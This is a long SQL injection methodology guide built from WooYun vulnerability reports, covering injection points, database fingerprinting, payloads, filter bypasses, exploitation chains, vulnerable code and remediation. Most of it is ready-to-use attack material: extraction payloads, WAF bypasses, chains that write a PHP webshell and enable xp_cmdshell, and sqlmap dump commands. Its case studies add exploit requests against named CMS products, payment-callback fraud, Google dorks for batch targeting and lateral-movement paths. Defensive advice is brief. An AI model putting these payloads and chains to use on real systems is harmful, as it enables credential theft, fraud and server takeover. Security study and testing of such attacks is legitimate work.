# SQL Injection Vulnerability Analysis Methodology

> Distilled from 27,732 cases | Data source: WooYun Vulnerability Database (2010-2016)

**Contents:** [1. Methodology Framework](#1-methodology-framework) | [2. Injection Point Identification](#2-injection-point-identification-patterns) | [3. Database Type Identification](#3-database-type-identification-methods) | [4. Injection Techniques & Payloads](#4-injection-technique-types-and-payloads) | [5. WAF/Filter Bypass](#5-waffilter-bypass-techniques)
[6. Exploitation Chains](#6-exploitation-chain-construction-methods) | [7. Vulnerable Code Patterns](#7-vulnerable-code-patterns) | [8. Case Summaries](#8-case-summaries) | [9. Testing Checklist](#9-testing-process-checklist) | [10. Defense](#10-defense-recommendations) | [Appendix](#appendix-data-statistics) | [Case Analyses](#case-analysis-1-access-database-boolean-based-blind-injection-in-practice)

---

## 1. Methodology Framework

### 1.1 Core Mental Model

```
Missing input validation -> Dynamic SQL concatenation -> Semantic boundary breach -> Database command execution
```

**Key Insight**: The essence of SQL injection is **confusion of the boundary between code and data**. Attackers control input to elevate what should be treated as data into executable SQL commands.

### 1.2 Attack Vector Classification

| Vector Type | Proportion | Typical Scenario |
|------------|-----------|-----------------|
| Login form injection | 66% | Username/password fields directly concatenated |
| Search box injection | 64% | LIKE statement fuzzy matching |
| POST parameter injection | 60% | Form submission data |
| HTTP header injection | 26% | User-Agent/Referer/X-Forwarded-For |
| GET parameter injection | 24% | URL parameter passing |
| Cookie injection | 12% | Session identifier handling |

---

## 2. Injection Point Identification Patterns

### 2.1 High-Risk Parameter Names (Sorted by Frequency)

```python
# High-frequency injection parameters extracted from 27,732 cases
TOP_VULNERABLE_PARAMS = {
    # Numeric ID types (most common)
    'id': 56,           # Resource identifier
    'sort_id': 37,      # Sort field
    'stid': 32,         # Status ID
    'fid': 8,           # Forum/file ID
    'hotelid': 11,      # Business entity ID
    'areainfoid': 8,    # Area information

    # Authentication-related (high risk)
    'username': 33,     # Username
    'password': 30,     # Password
    'userpwd': 11,      # Password variant

    # Business logic parameters
    'type': 18,         # Type selection
    'action': 7,        # Operation type
    'page': 4,          # Pagination parameter
    'name': 30,         # Name search

    # ASP.NET-specific (focus for .NET applications)
    '__viewstate': 58,
    '__eventvalidation': 56,
    '__eventargument': 52,
    '__eventtarget': 41,
}
```

### 2.2 URL Pattern Recognition

**High-risk URL patterns**:
```
# List/detail pages
/news/detail.php?id=1
/product/view.aspx?pid=123
/article.asp?aid=456

# Search functions
/search.php?keyword=test
/list.aspx?stid=5882&pageid=2

# Admin panels
/admin/login.aspx
/manage/user.php?action=edit&uid=1

# API endpoints
/api/getData.php?type=user&id=1
/service/query.aspx?cn=value
```

### 2.3 File Type Risk Assessment

| File Type | Risk Level | Typical Database |
|----------|-----------|-----------------|
| .php | High | MySQL |
| .aspx | High | MSSQL/Oracle |
| .asp | High | Access/MSSQL |
| .jsp | Medium | Oracle/MySQL |
| .do/.action | Medium | Oracle/MySQL |

---

## 3. Database Type Identification Methods

### 3.1 Fingerprinting Techniques

#### MySQL Identification
```sql
-- Version detection
AND @@version LIKE '%MySQL%'
AND version() IS NOT NULL

-- Unique functions
AND sleep(5)
AND benchmark(10000000,sha1('test'))

-- System tables
AND (SELECT 1 FROM information_schema.tables LIMIT 1)

-- Error signatures
"You have an error in your SQL syntax"
"Unknown column"
```

#### MSSQL Identification
```sql
-- Version detection
AND @@version LIKE '%Microsoft%'
AND db_name() IS NOT NULL

-- Unique functions
WAITFOR DELAY '0:0:5'
CONVERT(INT, @@version)

-- System tables
AND (SELECT 1 FROM sysobjects WHERE xtype='U')

-- Error signatures
"Unclosed quotation mark"
"Microsoft OLE DB Provider"
"Incorrect syntax near"
```

#### Oracle Identification
```sql
-- Version detection
AND (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL

-- Unique syntax
AND 1=1 FROM dual
AND rownum=1

-- Unique functions
CHR(65)||CHR(66)
UTL_HTTP.request('https://example.com/[redacted]')

-- Error signatures
"ORA-00942: table or view does not exist"
"ORA-01756: quoted string not properly terminated"
```

#### Access Identification
```sql
-- Unique syntax
AND (SELECT TOP 1 1 FROM MSysObjects)
AND 1=1--    (does not support # comments)

-- Error signatures
"Microsoft JET Database Engine"
"Syntax error in query expression"
```

### 3.2 Automated Identification Process

```
Step 1: Trigger errors
  Input: ' " ) ; --
  Observe: Error message characteristics

Step 2: Function probing
  MySQL: sleep(2)
  MSSQL: waitfor delay '0:0:2'
  Oracle: dbms_pipe.receive_message('a',2)

Step 3: System table verification
  MySQL: information_schema.tables
  MSSQL: sysobjects
  Oracle: all_tables
  Access: MSysObjects
```

---

## 4. Injection Technique Types and Payloads

### 4.1 Technique Distribution Statistics

| Technique Type | Frequency | Difficulty | Data Extraction Efficiency |
|---------------|----------|-----------|---------------------------|
| Boolean-based blind injection | 50% | Medium | Low |
| Error-based injection | 46% | Low | High |
| Time-based blind injection | 34% | High | Very low |
| Union-based injection | 36% | Low | Very high |
| Stacked queries injection | 20% | Medium | High |
| High-privilege exploitation | 68% | - | - |

### 4.2 Boolean-Based Blind Injection Payloads

```sql
-- Basic boolean
id=1 AND 1=1    -- Normal
id=1 AND 1=2    -- Abnormal

-- String type
id=1' AND '1'='1
id=1' AND '1'='2

-- MySQL RLIKE
id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))

-- Data extraction (character by character)
id=1 AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
```

### 4.3 Time-Based Blind Injection Payloads

```sql
-- MySQL
id=1 AND sleep(5)
id=1 AND IF(1=1,sleep(5),0)
id=(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))

-- Nested delay (real case)
id=(select(2)from(select(sleep(8)))v)

-- MSSQL
id=1; WAITFOR DELAY '0:0:5'--
id=1 IF (1=1) WAITFOR DELAY '0:0:5'

-- Oracle
id=1 AND dbms_pipe.receive_message('a',5)=1
```

### 4.4 Union-Based Injection Payloads

```sql
-- Column count detection
id=1 ORDER BY 1--
id=1 ORDER BY 2--
...
id=1 ORDER BY N-- (N-1 is the column count when error occurs)

-- Union injection
id=-1 UNION SELECT 1,2,3,4,5--
id=-1 UNION SELECT null,null,null--

-- Data extraction
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

### 4.5 Error-Based Injection Payloads

```sql
-- MySQL extractvalue
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))
id=1 AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))

-- MySQL updatexml
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
id=1 AND updatexml(1,concat(0x5c,database()),1)

-- MySQL floor error
id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)

-- MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
id=1 AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))

-- Real-world case payload
' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (4329=4329) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(122)+CHAR(113))) AND 'a'='a
```

---

## 5. WAF/Filter Bypass Techniques

### 5.1 Inline Comment Bypass

```sql
-- MySQL version comments (most commonly used)
/*!50000union*//*!50000select*/1,2,3
/*!UNION*//*!SELECT*/1,2,3

-- Real case (DeDeCMS bypass)
aid=1&_FILES[type][tmp_name]=\' or mid=@`\'` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd) from `#@__admin` limit 0,1),5,6,7,8,9#@`\'`
```

### 5.2 Encoding Bypass

```sql
-- Hexadecimal encoding
SELECT * FROM users WHERE name=0x61646d696e    -- 'admin'
CONCAT(0x7e,database(),0x7e)                   -- concat('~',database(),'~')

-- URL encoding
union%20select -> union select
%27 -> '
%23 -> #

-- Double URL encoding
%252f -> /
%2527 -> '

-- Unicode encoding
%u0027 -> '
%u002f -> /
```

### 5.3 Case Obfuscation

```sql
-- Simple obfuscation
UnIoN SeLeCt
uNiOn sElEcT

-- Random case
UNION/**/SELECT
```

### 5.4 Whitespace Substitution

```sql
-- Comment as space replacement
UNION/**/SELECT/**/1,2,3
UNION/*abc*/SELECT

-- Tab/newline
UNION%09SELECT
UNION%0ASELECT
UNION%0DSELECT

-- Parenthesis wrapping
(UNION)(SELECT)
```

### 5.5 Function Substitution

```sql
-- String extraction
SUBSTRING -> MID/SUBSTR/LEFT/RIGHT
-- MySQL
MID(password,1,1)
SUBSTR(password,1,1)

-- Character conversion
CHAR(65) -> A
CHR(65) -> A (Oracle)

-- Concatenation functions
CONCAT -> CONCAT_WS/||
```

### 5.6 Logical Equivalence Substitution

```sql
-- AND/OR replacement
AND 1=1 -> && 1=1 -> & 1
OR 1=1 -> || 1=1 -> | 1

-- Equals sign replacement
id=1 -> id LIKE 1
id=1 -> id BETWEEN 1 AND 1
id=1 -> id IN (1)
id=1 -> id REGEXP '^1$'

-- Quote bypass
'admin' -> CHAR(97,100,109,105,110)
'admin' -> 0x61646d696e
```

---

## 6. Exploitation Chain Construction Methods

### 6.1 Standard Exploitation Process

```
Phase 1: Confirm injection point
  |-- Single quote test: id=1'
  |-- Math operation: id=1-0, id=1*1
  +-- Time delay: id=1 and sleep(3)

Phase 2: Identify database type
  |-- Error message analysis
  +-- Characteristic function probing

Phase 3: Gather database information
  |-- Current database: database()
  |-- Current user: user()
  |-- Version information: version()
  +-- Privilege detection: is_dba

Phase 4: Enumerate database structure
  |-- Database list
  |-- Table name list
  +-- Column name list

Phase 5: Data extraction
  |-- Locate sensitive tables
  +-- Export data

Phase 6: Privilege escalation (optional)
  |-- File read/write
  +-- Command execution
```

### 6.2 MySQL Complete Exploitation Chain

```sql
-- Step 1: Get database information
union select 1,database(),version(),user(),5--

-- Step 2: Get all databases
union select 1,group_concat(schema_name),3 from information_schema.schemata--

-- Step 3: Get all tables in current database
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--

-- Step 4: Get column names for specified table
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--

-- Step 5: Extract data
union select 1,group_concat(username,0x3a,password),3 from users--

-- Step 6: File read (requires FILE privilege)
union select 1,load_file('/etc/passwd'),3--

-- Step 7: Write webshell (requires write privilege)
union select 1,'<?php @system($_POST[cmd]);?>',3 into outfile '/var/www/html/shell.php'--
```

### 6.3 MSSQL Complete Exploitation Chain

```sql
-- Step 1: Get system information
union select 1,@@version,db_name(),system_user,5--

-- Step 2: Get all databases
union select 1,name,3 from master..sysdatabases--

-- Step 3: Get all tables in current database
union select 1,name,3 from sysobjects where xtype='U'--

-- Step 4: Get column names for specified table
union select 1,name,3 from syscolumns where id=object_id('users')--

-- Step 5: Extract data
union select 1,username+':'+password,3 from users--

-- Step 6: Command execution (requires sa privilege)
; exec master..xp_cmdshell 'whoami'--

-- Step 7: Enable xp_cmdshell
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
```

### 6.4 Oracle Complete Exploitation Chain

```sql
-- Step 1: Get system information
union select banner,null from v$version where rownum=1--

-- Step 2: Get current user
union select user,null from dual--

-- Step 3: Get all tables
union select table_name,null from all_tables where rownum<=10--

-- Step 4: Get table structure
union select column_name,null from all_tab_columns where table_name='USERS'--

-- Step 5: Extract data
union select username||':'||password,null from users--
```

---

## 7. Vulnerable Code Patterns

### 7.1 PHP Typical Vulnerable Patterns

```php
// Pattern 1: Direct concatenation (most common)
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";

// Pattern 2: String concatenation
$username = $_POST['username'];
$sql = "SELECT * FROM users WHERE username = '$username'";

// Pattern 3: Insecure filtering
$id = addslashes($_GET['id']);  // Ineffective for numeric injection
$sql = "SELECT * FROM users WHERE id = $id";

// Pattern 4: Wide-byte injection
$name = addslashes($_GET['name']);
// Under GBK encoding, %bf%27 can bypass this
```

### 7.2 ASP/ASP.NET Typical Vulnerable Patterns

```vb
' Classic ASP pattern
id = Request("id")
sql = "SELECT * FROM users WHERE id=" & id

' ASP.NET direct parameter concatenation
string id = Request.QueryString["id"];
string sql = "SELECT * FROM users WHERE id=" + id;
```

### 7.3 Java Typical Vulnerable Patterns

```java
// String concatenation
String id = request.getParameter("id");
String sql = "SELECT * FROM users WHERE id = " + id;
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(sql);

// MyBatis improper ${} usage
// <select id="getUser">
//     SELECT * FROM users WHERE id = ${id}  <!-- Should use #{id} -->
// </select>
```

### 7.4 Remediation

```python
# Python - Parameterized query
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# PHP - PDO prepared statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

# Java - PreparedStatement
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, id);

# .NET - Parameterized query
cmd.CommandText = "SELECT * FROM users WHERE id = @id";
cmd.Parameters.AddWithValue("@id", id);
```

---

## 8. Case Summaries

### 8.1 High-Risk Case: DBA Privilege Acquisition

**Case ID**: wooyun-2015-0157074

**Target**: A software technology company

**Injection point**: POST parameter `txtuser`

**Technique**: Error-based injection + Boolean-based blind injection

**Payload**:
```sql
txtuser=-7004' OR 6089=6089#
txtuser=-8086' OR 1 GROUP BY CONCAT(0x716b767171,(SELECT (CASE WHEN (5800=5800) THEN 1 ELSE 0 END)),0x7171627171,FLOOR(RAND(0)*2)) HAVING MIN(0)#
```

**Result**: DBA privileges obtained, root password hash and 512 user passwords retrieved

---

### 8.2 Time-Based Blind Injection Case

**Case ID**: wooyun-2015-0114228

**Target**: A network technology company

**Injection point**: GET parameter `hotelid`

**Payload**:
```sql
hotelid=(select(2)from(select(sleep(8)))v)/*'+(select(0)from(select(sleep(0)))v)+'
hotelid=(SELECT (CASE WHEN (8177=8177) THEN SLEEP(10) ELSE 8177*(SELECT 8177 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
```

**Characteristics**: Double-layer SELECT nesting to achieve delay multiplication

---

### 8.3 Inline Comment Bypass Case

**Case ID**: wooyun-2015-0113920

**Target**: A major internet company (DeDeCMS system)

**Bypass technique**: MySQL version comments

**Payload**:
```
/plus/recommend.php?aid=1&_FILES[type][tmp_name]=aa\'and+char(@`\'`)
+/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x3C6162633E,
group_concat(0x7C,userid,0x3a,pwd,0x7C),0x3C2F6162633E),5,6,7,8,9
+from+`#@__admin`#"
```

---

### 8.4 MSSQL Command Execution Case

**Case ID**: wooyun-2015-0115882

**Target**: An education exam login system

**Injection point**: POST parameter `PassWord`

**Payload**:
```sql
PassWord=' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (4329=4329) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(122)+CHAR(113))) AND 'a'='a
```

**Characteristics**: CHAR function bypasses character filtering, CONVERT error-based injection

---

## 9. Testing Process Checklist

### 9.1 Quick Detection Process

```markdown
[ ] 1. Single quote test: Input ' and observe response
[ ] 2. Double quote test: Input " and observe response
[ ] 3. Comment test: Input --, #, /**/ and observe response
[ ] 4. Math operation: Input 1-0, 1*1 and observe response
[ ] 5. Boolean test: and 1=1 / and 1=2 comparison
[ ] 6. Time delay: and sleep(5) observe response time
[ ] 7. Order test: order by N incremental testing
```

### 9.2 SQLMap Common Parameters

```bash
# Basic detection
sqlmap -u "http://target/page.php?id=1" --batch

# POST request
sqlmap -u "http://target/login.php" --data="username=test&password=test" --batch

# Cookie injection
sqlmap -u "http://target/page.php" --cookie="id=1" --level=2 --batch

# HTTP header injection
sqlmap -u "http://target/page.php" --headers="X-Forwarded-For: 1" --level=3 --batch

# Time-based blind injection optimization
sqlmap -u "http://target/page.php?id=1" --technique=T --time-sec=2 --batch

# WAF bypass
sqlmap -u "http://target/page.php?id=1" --tamper=space2comment,between --batch

# Data extraction
sqlmap -u "http://target/page.php?id=1" --dbs --batch
sqlmap -u "http://target/page.php?id=1" -D database --tables --batch
sqlmap -u "http://target/page.php?id=1" -D database -T table --columns --batch
sqlmap -u "http://target/page.php?id=1" -D database -T table -C col1,col2 --dump --batch
```

---

## 10. Defense Recommendations

### 10.1 Code-Level Defenses

1. **Parameterized queries** (preferred)
2. **Stored procedures** (secondary)
3. **Input validation** (allowlist validation)
4. **Principle of least privilege** (database accounts)

### 10.2 Architecture-Level Defenses

1. **WAF deployment**
2. **Database auditing**
3. **Error message suppression**
4. **Network isolation**

---

## Appendix: Data Statistics

### A. Annual Trends

| Year | Count | Proportion |
|-----|------|------|
| 2010 | 158 | 0.6% |
| 2011 | 320 | 1.2% |
| 2012 | 1,115 | 4.0% |
| 2013 | 3,058 | 11.0% |
| 2014 | 7,375 | 26.6% |
| 2015 | 13,802 | 49.8% |
| 2016 | 1,904 | 6.9% |

### B. Industry Distribution

| Industry | Count | Proportion |
|---------|------|------|
| Internet/Other | 23,679 | 85.4% |
| Education | 2,751 | 9.9% |
| Finance | 461 | 1.7% |
| Government | 422 | 1.5% |
| E-commerce | 243 | 0.9% |

### C. Database Distribution (Top 50 Detailed Cases)

| Database | Count |
|---------|------|
| MySQL | 23 |
| Access | 17 |
| MSSQL | 14 |
| Oracle | 10 |
| PostgreSQL | 2 |

---

## Case Analysis #1: Access Database Boolean-Based Blind Injection in Practice

### Knowledge Source
- **Case**: wooyun-2015-0107553
- **Title**: SQL injection in a courseware management system
- **Vendor**: A software development company
- **Impact**: Courseware management system used by numerous universities

### Core Problem

Access databases lack system metadata tables (no `information_schema` equivalent), so SQLMap fails to enumerate table names. Attackers complete the chain through **source code leaks** or **table name guessing**. Source code was downloadable from the vendor's official website.

### Attack Path

```
Injection point discovery -> DB type identification -> SQLMap fails (no metadata) -> Download source code -> Extract table names -> Manual blind injection
```

- **Parameter**: GET `id` (numeric)
- **Injection type**: Boolean-based blind, WHERE/HAVING clause
- **Environment**: Microsoft Access, Windows 2003/XP + IIS 6.0 + ASP.NET 2.0.50727
- **Table naming**: `C_User` (C prefix convention), reusable across university deployments

### Exploitation Payloads

**Boolean-based blind injection**:
```sql
-- Numeric injection (no quote closure needed)
action=update&id=8 AND 5342=5342  -- True
action=update&id=8 AND 5342=5343  -- False

-- Determine username length
action=update&id=8 AND (SELECT TOP 1 LEN(username) FROM C_User) > 5

-- Character-by-character extraction
action=update&id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) > 97
action=update&id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 97  -- 'a'

-- Password hash extraction
action=update&id=8 AND ASCII((SELECT TOP 1 MID(password,1,1) FROM C_User WHERE username='admin')) > 48

-- Multi-user enumeration (using NOT IN)
action=update&id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User WHERE id NOT IN (SELECT TOP 1 id FROM C_User))) > 97
```

**Time-based alternative** (Access has no SLEEP):
```sql
-- Cartesian product delay (record count grows exponentially)
action=update&id=8 AND (SELECT COUNT(*) FROM C_User AS T1, C_User AS T2, C_User AS T3, C_User AS T4, C_User AS T5, C_User AS T6, C_User AS T7, C_User AS T8, C_User AS T9, C_User AS T10) > 0
```

### Access-Specific Constraints

```sql
-- Unsupported: UNION SELECT (some versions), SLEEP/WAITFOR, information_schema, # comments
-- Limited subquery nesting depth

-- Exploitable unique syntax:
-- TOP clause: SELECT TOP 1 * FROM table
-- MID function: MID(string, start, length)
-- ASC function: ASC('A') = 65
-- IIF function: IIF(condition, true_value, false_value)
```

### Bypass Techniques

| Bypass Type | Technique | Scenario |
|------------|-----------|----------|
| **No metadata tables** | Download source code -> static analysis for table structure | Vendor provides source download |
| **SQLMap failure** | Manual blind injection with binary search (7 requests/char vs 94 linear) | Access databases |
| **Batch exploitation** | Table name reuse (`C_User` prefix) across sites | Same vendor multi-site deployments |

### Extended Attack Surface

```sql
-- Enumerate tables by naming convention
SELECT * FROM C_Admin    -- Administrators
SELECT * FROM C_User     -- Users
SELECT * FROM C_Teacher  -- Teachers
SELECT * FROM C_Student  -- Students
SELECT * FROM C_Course   -- Courses

-- System tables (requires privileges)
SELECT name FROM MSysObjects WHERE type=1 AND flags=0
```

**Escalation path**: Access injection -> .mdb download -> local cracking -> admin password; batch university sites -> education network lateral movement

---

## Case Analysis #2: Education Website Sub-Site SQL Injection Pattern

### Knowledge Source
- **Case**: wooyun-2015-0137200
- **Title**: SQL injection in a sub-site of an organization
- **Vendor**: A major university
- **Impact**: Educational institution sub-site systems

### Core Problem

University websites use a **main site + sub-site** distributed model. Sub-sites are developed independently by departments or outsourced teams with varying security levels. Users trust `subdomain.university.edu` equally as the main site, creating a trust inheritance risk. Security budget concentrates on the main site; sub-sites become forgotten corners.

### Attack Path

```
Sub-site enumeration -> Fingerprinting -> Parameter discovery -> Injection testing -> Privilege escalation -> Intranet lateral movement
```

- **Sub-site types**: Third-level domains (`xxx.university.edu`), second-level directories (`university.edu/xxx`)
- **Stack**: PHP/ASP + MySQL/Access, outdated CMS systems, no WAF, error messages exposed
- **Amplification**: Shared database servers enable lateral movement to main site data

### Sub-Site Enumeration Methods

```
site:university.edu -www                          # Search engine syntax
crt.sh: Query all subdomains for *.university.edu # Certificate transparency logs
axfr @dns.university.edu university.edu           # DNS zone transfer
sublist3r -d university.edu                       # Subdomain brute-force
```

### Common Sensitive Tables (WooYun Statistics)

```sql
SELECT * FROM student / student_info  -- Student information
SELECT * FROM teacher / faculty       -- Faculty information
SELECT * FROM admin / administrator   -- Administrators
SELECT * FROM score                   -- Grades
SELECT * FROM course                  -- Courses
```

### Education Website-Specific Bypasses

```
X-Forwarded-For: [campus IP]         -- IP allowlist bypass
Cookie: PHPSESSID=admin'; --          -- Cookie validation bypass
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)  -- Crawler spoofing
X-Forwarded-Proto: https             -- HTTPS redirect bypass
```

### Extended Attack Surface

**Sub-site to intranet**: SQL injection -> `load_file('/var/www/html/config.php')` -> discover DB credentials -> connect to main site database -> export faculty/student data, financial records, research data, email credentials.

**Sub-site to RCE**: SQL injection -> write WebShell -> system privileges; or read config -> intranet credentials -> lateral movement across education network.

### Statistical Insights (WooYun Data)

| Feature | Data |
|---------|------|
| Sub-site vulnerability proportion | 67% |
| Legacy systems (PHP 5.x / Classic ASP) | 52% |
| Overly permissive DB privileges | 71% |
| No WAF protection | 83% |
| Can obtain sensitive data | 94% |
| Intranet connectivity | 68% |

**High-risk CMS in university sub-sites**: DeDeCMS, PHPWind (high risk); Discuz!, EmpireCMS (medium risk); custom-built systems (very high risk, no security review).

---

## Case Analysis #3: SQL Injection in Authenticated P2P Lending System

### Knowledge Source
- **Case**: wooyun-2015-0143727 (Dswjcms! X1.3 Multiple SQL Injections)
- **Related cases**:
  - wooyun-2015-0143727: Dswjcms X1.3 multiple SQL injections (requires member login)
  - wooyun-2015-0110xxx: Dswjcms P2P lending system frontend SQL injection
  - wooyun-2015-0110xxx: Dswjcms 1.4 SQL blind injection vulnerability
- **Vendor**: Dswjcms.com (P2P lending system focused on ThinkPHP framework)
- **Impact**: Numerous lending platforms using this system

### Core Problem

Post-authentication SQL injection points are invisible to conventional scanners. ThinkPHP 3.x's `M()` method returns the base Model with no data validation, and developers directly concatenate user input into `where()` clauses. Numeric injection is especially stealthy since no quote closure is needed.

### Attack Path

```
Info gathering -> Register member account -> Login -> Business function traversal -> Parameter injection testing
```

- **Injection parameters**: `bid`, `uid`, `id`, `mid`, `nper`, `email`, `out_trade_no`
- **Injection patterns**: `where('bid='.$this->_get('bid'))` (numeric), `where('email='".$this->_post('email')."'")` (string)
- **Prerequisites**: Valid login session, pseudo-static `.html` suffix must be removed for testing

### Exploitation: 4 Vulnerable Endpoints

**Point 1: invest function -- union query injection**

```php
// /Lib/Action/Home/CenterAction.class.php
$refun = $refund->where('bid='.$this->_get('bid').' and uid='.$this->_session('user_uid'))->select();
```

```http
GET /Center/invest/?mid=plan&bid=1) UNION SELECT 1,concat(username,0x2c,password),3,4,5,6,7,8 from ds_admin%23 HTTP/1.1
Cookie: PHPSESSID=logged_in_session_id
```

```sql
bid=1 ORDER BY 8   -- Normal (8 columns)
bid=1 ORDER BY 9   -- Error
bid=-1 UNION SELECT 1,concat(username,0x2c,password),3,4,5,6,7,8 from ds_admin-- -
bid=-1 UNION SELECT 1,group_concat(table_name),3,4,5,6,7,8 from information_schema.tables where table_schema=database()-- -
bid=-1 UNION SELECT 1,group_concat(column_name),3,4,5,6,7,8 from information_schema.columns where table_name='ds_user'-- -
```

**Point 2: loan function -- time-based blind injection**

```php
$borrow = $borrowing->field('money')->where('`id`='.$this->_get('bid'))->find();
```

```http
GET /Center/loan/?mid=plan&bid=1) AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'%23 HTTP/1.1
```

```sql
bid=1) AND IF((SELECT database())='dswjcms',SLEEP(6),0)-- -
bid=1) AND IF(ASCII((SELECT SUBSTRING(password,1,1) FROM ds_admin LIMIT 1))>48,SLEEP(2),0)-- -
```

**Point 3: emailVerify function -- POST string injection**

```php
$getfield = $userinfo->where("`id`=".$this->_session('user_uid')." and `email`='".$this->_post('email')."'")->find();
```

```http
POST /Center/emailVerify/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=test') AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'%23
```

```sql
email=admin' AND (SELECT COUNT(*) FROM ds_user WHERE username='admin')>0-- -
email=admin' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- -
```

**Point 4: alipayreturn function -- payment callback injection**

```php
$rechar = $recharge->where('nid='.$this->_get('out_trade_no'))->find();
$recharge->where('nid='.$this->_get('out_trade_no'))->save(array('type'=>2,'audittime'=>time()));
// Two injection points in both SELECT and UPDATE
```

```sql
-- Change recharge status to success (bypass payment)
out_trade_no=test' OR 1=1-- -
-- Blind injection to obtain user data
out_trade_no=test') AND SLEEP(6)-- -
```

### ThinkPHP M() Method Bypass Patterns

```php
$this->_get('param')    // I('get.param') defaults to htmlspecialchars
$this->_post('param')   // But numeric injection is unaffected

M('table')  // Returns base Model, no data validation
D('table')  // Returns specific Model, may have field validation

// Array-style where clause bypass
$where['id'] = array('eq', $_GET['id']);  // May bypass filtering
```

**Pseudo-static URL conversion** (ThinkPHP): `/Module/Controller/Method/param1/value1.html` -> `?param1=value1`

### Batch Exploitation Methodology

**Google Hacking dorks**:
- `intext:"Powered by Dswjcms"`
- `intitle:"Dswjcms P2P lending system"`
- `inurl:/Center/invest`

**Extended attack surface**:
```
SQL injection -> ds_admin credentials -> Backend login -> File upload -> WebShell
           |
       Read config files -> DB connection info -> Export all user data
           |
       Payment callback injection -> Tamper recharge amount -> Financial loss
           |
       Batch lending sites -> Entire industry data breach
```

### ThinkPHP 3.x Fix Patterns

```php
// Wrong: direct concatenation with M()
$refund->where('bid='.$this->_get('bid'))->select();

// Correct: array-style where with intval
$refund->where(array('bid' => I('get.bid', 0, 'intval')))->select();

// Best: prepared statements
$Model->query("SELECT * FROM table WHERE bid = ?", array($bid));
```

---

*Document last updated: 2026-01-23 (Added authenticated CMS injection case)*
*Data source: WooYun Vulnerability Database (2010-2016)*
